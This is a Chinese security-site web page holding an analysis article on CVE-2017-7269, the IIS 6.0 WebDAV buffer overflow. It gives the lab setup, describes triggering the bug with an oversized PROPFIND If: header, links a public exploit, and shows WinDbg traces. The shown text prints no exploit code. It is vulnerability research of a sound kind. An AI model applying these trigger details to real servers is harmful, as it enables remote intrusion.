<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【漏洞分析】CVE-2017-7269：IIS6.0远程代码执行漏洞分析及Exploit - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="IIS 6.0 0day,CVE-2017-7269,远程代码执行"/>
    
        <meta name="description" content="开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【漏洞分析】CVE-2017-7269：IIS6.0远程代码执行漏洞分析及Exploit</h2>
                <div class="article-msg">
                    <span class="time">2017-03-30 10:37:03</span>
                                        <span class="read">阅读：78643次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3664"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3664" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p><br/></p><p style="text-align: center;"><img src="http://p4.qhimg.com/t018354f57dfb2186c9.jpg" title="t011b8c0a8f995e7449.jpg" alt="http://p5.qhimg.com/t011b8c0a8f995e7449.jpg"/></p><p><br/></p><p><br/></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em; font-size: 18px;">漏洞描述</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">漏洞编号：CVE-2017-7269</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞简述：开启WebDAV服务的IIS 6.0被爆存在<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">缓存区溢出漏洞导致远程代码执行</span>，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞类型：缓冲区溢出</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞等级：高危</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">触发函数：ScStoragePathFromUrl函数</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">附加信息：ScStoragePathFromUrl函数被调用了两次</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">“If: &lt;http://”开始的较长header头的PROPFIND请求</span>执行任意代码。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei">漏洞分析（漏洞分析转载自：<a href="http://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html" _src="http://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html">http://whereisk0shl.top/cve-2017-7269-iis6-interesting-exploit.html</a>）</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">CVE-2017-7269是IIS 6.0中存在的一个栈溢出漏洞，在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，该漏洞可以导致远程代码执行。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">目前在github上有一个在windows server 2003 r2上稳定利用的exploit，这个exp目前执行的功能是弹计算器，使用的shellcode方法是alpha shellcode，这是由于url在内存中以宽字节形式存放，以及其中包含的一些badchar，导致无法直接使用shellcode执行代码，而需要先以alpha shellcode的方法，以ascii码形式以宽字节写入内存，然后再通过一小段解密之后执行代码。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">github地址：https://github.com/edwardz246003/IIS_exploit</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个漏洞其实原理非常简单，但是其利用方法却非常有趣，我在入门的时候调试过很多stack overflow及其exp，但多数都是通过覆盖ret，覆盖seh等方法完成的攻击，直到我见到了这个exploit，感觉非常艺术。但这个漏洞也存在其局限性，比如对于aslr来说似乎没有利用面，因此在高版本windows server中利用似乎非常困难，windows server 2003 r2没有aslr保护。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这篇文章中，我将首先简单介绍一下这个漏洞的利用情况；接着，我将和大家一起分析一下这个漏洞的形成原因；然后我将给大家详细介绍这个漏洞的利用，最后我将简要分析一下这个漏洞的rop及shellcode。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我是一只菜鸟，如有不当之处，还望大家多多指正，感谢阅读！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">弹弹弹－－一言不合就“弹”计算器</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">漏洞环境搭建</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞环境的搭建非常简单，我的环境是windows server 2003 r2 32位英文企业版，安装之后需要进入系统配置一下iis6.0，首先在登陆windows之后，选择配置服务器，安装iis6.0服务，之后进入iis6.0管理器，在管理器中，有一个windows扩展，在扩展中有一个webdav选项，默认是禁用状态，在左侧选择allow，开启webdav，之后再iis管理器中默认网页中创建一个虚拟目录（其实这一步无所谓），随后选择run-&gt;services.msc-&gt;WebClient服务，将其开启，这样完成了我的配置。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">触发漏洞</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞触发非常简单，直接在本地执行python exp.py即可，这里为了观察过程，我修改了exp，将其改成远程，我们通过wireshark抓包，可以看到和目标机的交互行为。</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p3.qhimg.com/t01374f4ec087b9b6af.png" title="t01beaec6bcc0e6307f.png" alt="http://p6.qhimg.com/t01beaec6bcc0e6307f.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，攻击主机向目标机发送了一个PROPFIND数据包，这个是负责webdav处理的一个指令，其中包含了我们的攻击数据，一个&lt;&gt;包含了两个超长的httpurl请求，其中在两个http url中间还有一个lock token的指令内容。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">随后我们可以看到，在靶机执行了calc，其进程创建在w2wp进程下，用户组是NETWORK SERVICE。</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p2.qhimg.com/t0144a623745da05822.png" title="t01fe4526e2ada2a719.png" alt="http://p2.qhimg.com/t01fe4526e2ada2a719.png"/></p><p style="text-indent: 2em;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我在最开始的时候以为这个calc是由于SW_HIDE的参数设置导致在后台运行，后来发现其实是由于webdav服务进程本身就是无窗口的，导致calc即使定义了SW_SHOWNORMAL，也只是在后台启动了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">事实上，这个漏洞及时没有后面的&lt;&gt;中的http url，单靠一个IF:&lt;&gt;也能够触发，而之所以加入了第二个&lt;&gt;以及lock token，是因为作者想利用第一次和第二次http请求来完成一次精妙的利用，最后在指令下完成最后一击。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我尝试去掉第二次&lt;&gt;以及请求，同样能引发iis服务的crash。</span></p><p style="text-indent: 0em; text-align: center;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong><img src="http://p7.qhimg.com/t01bf42e91697628a5b.png" title="t0128bd34ae7ca9222e.png" alt="http://p3.qhimg.com/t0128bd34ae7ca9222e.png"/></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">CVE-2017-7269漏洞分析</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个漏洞的成因是在WebDav服务动态链接库的httpext.dll的ScStorageFromUrl函数中，这里为了方便，我们直接来跟踪分析该函数，在下一小节内容，我将和大家来看看整个精妙利用的过程。我将先动态分析整个过程，然后贴出这个存在漏洞函数的伪代码。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在ScStorageFromUrl函数中，首先会调用ScStripAndCheckHttpPrefix函数，这个函数主要是获取头部信息进行检查以及对host name进行检查。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p//调用CchUrlPrefixW获取url头部信息
eax=67113bc8&nbsp;ebx=00fffbe8&nbsp;ecx=00605740&nbsp;edx=00fff4f8&nbsp;esi=0060c648&nbsp;edi=00605740
eip=671335f3&nbsp;esp=00fff4b4&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStripAndCheckHttpPrefix+0x1e:
671335f3&nbsp;ff5024&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[eax+24h]&nbsp;&nbsp;ds:0023:67113bec={httpext!CEcbBaseImpl&lt;IEcb&gt;::CchUrlPrefixW&nbsp;(6712c72a)}
0:009&gt;&nbsp;p
eax=00000007&nbsp;ebx=00fffbe8&nbsp;ecx=00fff4cc&nbsp;edx=00fff4f8&nbsp;esi=0060c648&nbsp;edi=00605740
eip=671335f6&nbsp;esp=00fff4b8&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStripAndCheckHttpPrefix+0x21:
671335f6&nbsp;8bd8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,eax
0:009&gt;&nbsp;dc&nbsp;esi&nbsp;l6//esi存放头部信息，以及server&nbsp;name，这个localhost会在后面获取到。
0060c648&nbsp;&nbsp;00740068&nbsp;00700074&nbsp;002f003a&nbsp;006c002f&nbsp;&nbsp;h.t.t.p.:././.l.
0060c658&nbsp;&nbsp;0063006f&nbsp;006c0061&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o.c.a.l.</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在check完http头部和hostname之后，会调用wlen函数获取当前http url长度。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=0060e7d0&nbsp;ebx=0060b508&nbsp;ecx=006058a8&nbsp;edx=0060e7d0&nbsp;esi=00605740&nbsp;edi=00000000
eip=67126ce8&nbsp;esp=00fff330&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStoragePathFromUrl+0x6d:
67126ce8&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
0:009&gt;&nbsp;p
eax=0060e7d0&nbsp;ebx=0060b508&nbsp;ecx=006058a8&nbsp;edx=0060e7d0&nbsp;esi=00605740&nbsp;edi=00000000
eip=67126ce9&nbsp;esp=00fff32c&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStoragePathFromUrl+0x6e:
67126ce9&nbsp;ff1550121167&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[httpext!_imp__wcslen&nbsp;(67111250)]&nbsp;ds:0023:67111250={msvcrt!wcslen&nbsp;(77bd8ef2)}
0:009&gt;&nbsp;r&nbsp;eax
eax=0060e7d0
0:009&gt;&nbsp;dc&nbsp;eax
0060e7d0&nbsp;&nbsp;0062002f&nbsp;00620062&nbsp;00620062&nbsp;00620062&nbsp;&nbsp;/.b.b.b.b.b.b.b.
0060e7e0&nbsp;&nbsp;61757948&nbsp;6f674f43&nbsp;48456b6f&nbsp;67753646&nbsp;&nbsp;HyuaCOgookEHF6ug
0060e7f0&nbsp;&nbsp;38714433&nbsp;5a625765&nbsp;56615435&nbsp;6a536952&nbsp;&nbsp;3Dq8eWbZ5TaVRiSj
0060e800&nbsp;&nbsp;384e5157&nbsp;63555948&nbsp;43644971&nbsp;34686472&nbsp;&nbsp;WQN8HYUcqIdCrdh4
0060e810&nbsp;&nbsp;71794758&nbsp;6b55336b&nbsp;504f6d48&nbsp;34717a46&nbsp;&nbsp;XGyqk3UkHmOPFzq4
0060e820&nbsp;&nbsp;74436f54&nbsp;6f6f5956&nbsp;34577341&nbsp;7a726168&nbsp;&nbsp;ToCtVYooAsW4harz
0060e830&nbsp;&nbsp;4d493745&nbsp;5448574e&nbsp;367a4c38&nbsp;62663572&nbsp;&nbsp;E7IMNWHT8Lz6r5fb
0060e840&nbsp;&nbsp;486d6e43&nbsp;61773548&nbsp;61744d5a&nbsp;43654133&nbsp;&nbsp;CnmHH5waZMta3AeC
0:009&gt;&nbsp;p
eax=000002fd&nbsp;ebx=0060b508&nbsp;ecx=00600000&nbsp;edx=0060e7d0&nbsp;esi=00605740&nbsp;edi=00000000
eip=67126cef&nbsp;esp=00fff32c&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!ScStoragePathFromUrl+0x74:
67126cef&nbsp;59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx
0:009&gt;&nbsp;r&nbsp;eax
eax=000002fd</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在利用的关键一次，我们获取的是poc中http://localhost/bbbbb的字符串，这个字符串长度很长，可以看到eax寄存器存放的是url长度，长度是0x2fd，随后会进入一系列的判断，主要是检查url中一些特殊字符，比如0x2f。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;g//eax存放的是指向url的指针，这里会获取指针的第一个字符，然后和“／”作比较
Breakpoint&nbsp;1&nbsp;hit
eax=0060e7d0&nbsp;ebx=0060b508&nbsp;ecx=006058a8&nbsp;edx=0060e7d0&nbsp;esi=00605740&nbsp;edi=00000000
eip=67126cd7&nbsp;esp=00fff334&nbsp;ebp=00fff798&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStoragePathFromUrl+0x5c:
67126cd7&nbsp;6683382f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;word&nbsp;ptr&nbsp;[eax],2Fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:0060e7d0=002f
0:009&gt;&nbsp;dc&nbsp;eax
0060e7d0&nbsp;&nbsp;0062002f&nbsp;00620062&nbsp;00620062&nbsp;00620062&nbsp;&nbsp;/.b.b.b.b.b.b.b.
